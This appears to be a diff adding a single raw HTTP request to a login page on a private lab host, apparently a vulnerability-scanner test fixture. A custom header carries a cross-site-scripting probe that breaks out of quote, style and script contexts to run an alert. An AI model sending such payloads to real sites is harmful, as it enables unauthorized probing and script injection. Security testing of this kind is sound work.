@@ -1,0 +1,9 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+WBH-b3b846: '\"-></style></script><script>alert(0x000123)</script>
+Cookie: PHPSESSID=1rmi09rj8501456hjja86040g7; security=low
+
